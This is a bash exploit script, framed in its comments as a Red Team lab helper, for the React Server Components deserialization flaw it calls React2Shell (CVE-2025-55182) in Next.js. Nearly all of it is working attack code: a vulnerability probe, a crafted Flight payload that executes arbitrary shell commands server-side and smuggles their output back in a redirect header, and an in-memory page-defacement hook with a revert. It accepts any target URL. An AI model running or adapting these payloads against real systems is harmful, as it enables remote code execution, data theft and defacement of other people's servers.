#!/usr/bin/env bash
# React2Shell (CVE-2025-55182) helper for the Red Team walkthrough.
# The Blue challenge runs Next.js 15.5.6 with React 19.1.1, both inside the
# vulnerable range of the Flight deserialization bug.
set -euo pipefail

fail() {
  printf '%s\n' "$*" >&2
  exit 1
}

usage() {
  printf 'Usage: bash %s probe <target-url>\n' "${0##*/}" >&2
  printf '       bash %s exploit <target-url> [command]\n' "${0##*/}" >&2
  printf '       bash %s payload <target-url> [command]\n' "${0##*/}" >&2
  printf '       bash %s code <target-url> [command]\n' "${0##*/}" >&2
  printf '       bash %s raw <target-url> [command]\n' "${0##*/}" >&2
  printf '       bash %s deface <target-url>\n' "${0##*/}" >&2
  printf '       bash %s revert <target-url>\n' "${0##*/}" >&2
  exit 2
}

# Escape a command for a single-quoted JavaScript string inside a JSON document.
js_escape() {
  local text=$1
  text=${text//\\/\\\\}
  text=${text//\"/\\\"}
  text=${text//\'/\\\\\'}
  printf '%s' "$text"
}

# Escape raw JavaScript for the JSON document that carries it.
json_escape() {
  local text=$1
  text=${text//\\/\\\\}
  text=${text//\"/\\\"}
  text=${text//$'\n'/\\n}
  printf '%s' "$text"
}

http_code() {
  sed -n 's/^HTTP\/[^ ]* \([0-9][0-9][0-9]\).*/\1/p' <<< "$1" | tail -n 1
}

# Hook the running page handler so GET / shows the Red Team banner.
# The service mounts everything read-only, so the change lives in memory
# only and survives until the challenge service restarts or is reverted.
readonly DEFACE_JS='var http = process.mainModule.require("http");
var proto = http.Server.prototype;
if (globalThis.__r2s_origEmit) {
  var d = new Error();
  d.digest = "NEXT_REDIRECT;push;http://x/hook-already;307;";
  throw d;
}
globalThis.__r2s_origEmit = proto.emit;
proto.emit = function (event, a, b) {
  var result = globalThis.__r2s_origEmit.apply(this, arguments);
  if (event === "request" && a && b && a.url === "/" && !b.__r2s) {
    b.__r2s = true;
    var ow = b.write;
    var oe = b.end;
    b.write = function (chunk, enc, cb) {
      return ow.call(this, r2sDeface(chunk), enc, cb);
    };
    b.end = function (chunk, enc, cb) {
      var fixed = r2sDeface(chunk);
      if (fixed !== chunk) {
        var len = this.getHeader("Content-Length");
        if (len !== undefined && len !== null) {
          this.setHeader("Content-Length", typeof fixed === "string" ? Buffer.byteLength(fixed) : fixed.length);
        }
      }
      return oe.call(this, fixed, enc, cb);
    };
  }
  return result;
};
function r2sDeface(chunk) {
  var text;
  if (typeof chunk === "string") {
    text = chunk;
  } else if (chunk && typeof chunk.toString === "function") {
    text = chunk.toString("utf8");
  } else {
    return chunk;
  }
  if (text.indexOf("React2Shell Lab") === -1) {
    return chunk;
  }
  text = text.split(">React2Shell Lab</h1>").join("><span style=\"color:#ef4444\">REACT2SHELL LAB - RED TEAM WAS HERE</span></h1>");
  text = text.split("React2Shell Lab").join("REACT2SHELL LAB - RED TEAM WAS HERE");
  if (typeof chunk === "string") {
    return text;
  }
  return Buffer.from(text, "utf8");
}
var e2 = new Error();
e2.digest = "NEXT_REDIRECT;push;http://x/hook-installed;307;";
throw e2;'

readonly REVERT_JS='var http = process.mainModule.require("http");
if (!globalThis.__r2s_origEmit) {
  var nr = new Error();
  nr.digest = "NEXT_REDIRECT;push;http://x/hook-absent;307;";
  throw nr;
}
http.Server.prototype.emit = globalThis.__r2s_origEmit;
delete globalThis.__r2s_origEmit;
var e3 = new Error();
e3.digest = "NEXT_REDIRECT;push;http://x/hook-reverted;307;";
throw e3;'

# POST two Flight chunks as multipart form fields and return headers plus body.
# Chunks are sent in argument order, so name references resolve only if the
# referenced chunk arrives first.
post_chunks() {
  local name1=$1 payload1=$2 name2=$3 payload2=$4
  printf '%s' "$payload1" > "$work/chunkA"
  printf '%s' "$payload2" > "$work/chunkB"
  curl --noproxy '*' --silent --show-error --connect-timeout 8 --max-time 30 \
    --request POST --header 'Next-Action: x' \
    --form "${name1}=<${work}/chunkA" --form "${name2}=<${work}/chunkB" \
    --dump-header - \
    -- "$target" || fail "Could not reach $target"
}

# Build the crafted Flight chunk that carries the JavaScript payload.
build_chunk0() {
  local escaped
  escaped=$(json_escape "$1")
  printf '%s' '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"'
  printf '%s' "$escaped"
  printf '%s' '","_formData":{"get":"$1:constructor:constructor"}}}'
}

# Send one JavaScript payload and return the untouched HTTP response.
run_js() {
  local chunk0
  chunk0=$(build_chunk0 "$1")
  post_chunks 0 "$chunk0" 1 '"$@0"'
}

# Run attacker-controlled JavaScript through the deserialization bug and
# print what the redirect header carries: base64 command output for the
# command payloads, or a status marker for the page-hook payloads.
send_js() {
  local js=$1 response header encoded output
  response=$(run_js "$js")
  header=$(grep -i '^x-action-redirect:' <<< "$response" | tail -n 1 | sed 's/^[^:]*:[[:space:]]*//' | tr -d '\r')

  if [[ -z $header ]]; then
    case $(http_code "$response") in
      500) fail 'HTTP 500 without command output. The payload was rejected on the challenge host.' ;;
      *) fail "Unexpected HTTP $(http_code "$response") response without command output." ;;
    esac
  fi

  encoded=${header#http://x/}
  encoded=${encoded%;push}
  encoded=${encoded%;replace}
  if ! output=$(printf '%s' "$encoded" | base64 --decode 2>/dev/null); then
    output=$encoded
  fi
  printf '%s\n' "${output:-(no output)}"
}

probe() {
  local response code
  response=$(post_chunks 1 '{}' 0 '["$1:a:a"]')
  code=$(http_code "$response")
  case $code in
    500)
      if grep -q 'E{"digest"' <<< "$response"; then
        printf 'HTTP 500 with the Flight error digest: the challenge is vulnerable to React2Shell.\n'
      else
        printf 'HTTP 500 without the expected digest: the verdict is ambiguous.\n'
        printf '%s\n' "$response"
      fi
      ;;
    '')
      fail "The response had no HTTP status line."
      ;;
    *)
      printf 'HTTP %s without the vulnerable crash: the challenge looks patched or does not run RSC.\n' "$code"
      ;;
  esac
}

# Build the redirect-exfil JavaScript that runs a shell command server-side.
command_js() {
  local escaped
  escaped=$(js_escape "$1")
  printf '%s' "var o=Buffer.from(process.mainModule.require('child_process').execSync('${escaped}')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;"
}

exploit() {
  local command=${1:-id} output
  output=$(send_js "$(command_js "$command")")
  printf '%s\n' "${output:-(no output)}"
}

# Print the exact chunks the exploit would send, without sending them.
payload() {
  printf 'chunk 0: %s\n' "$(build_chunk0 "$(command_js "${1:-id}")")"
  printf 'chunk 1: "$@0"\n'
}

# Print the JavaScript one-liner a command becomes, without sending it.
code() {
  printf 'javascript: %s\n' "$(command_js "${1:-id}")"
}

# Send a command payload and print the raw response, headers first.
raw() {
  run_js "$(command_js "${1:-id}")"
}

deface() {
  case $(send_js "$DEFACE_JS") in
    hook-installed) printf 'The page hook is installed: GET / now shows the Red Team banner.\n' ;;
    hook-already) printf 'The page hook was already installed.\n' ;;
    *) fail 'The deface payload answered with an unexpected marker.' ;;
  esac
}

revert() {
  case $(send_js "$REVERT_JS") in
    hook-reverted) printf 'The page hook is removed: GET / serves the original page again.\n' ;;
    hook-absent) printf 'No page hook was installed, so there is nothing to revert.\n' ;;
    *) fail 'The revert payload answered with an unexpected marker.' ;;
  esac
}

work=$(mktemp -d)
trap 'rm -rf -- "$work"' EXIT

case ${1:-} in
  probe)
    (( $# == 2 )) || usage
    target=$2
    probe
    ;;
  exploit)
    (( $# == 2 || $# == 3 )) || usage
    target=$2
    exploit "${3:-id}"
    ;;
  payload)
    (( $# == 2 || $# == 3 )) || usage
    target=$2
    payload "${3:-id}"
    ;;
  code)
    (( $# == 2 || $# == 3 )) || usage
    target=$2
    code "${3:-id}"
    ;;
  raw)
    (( $# == 2 || $# == 3 )) || usage
    target=$2
    raw "${3:-id}"
    ;;
  deface)
    (( $# == 2 )) || usage
    target=$2
    deface
    ;;
  revert)
    (( $# == 2 )) || usage
    target=$2
    revert
    ;;
  *) usage ;;
esac
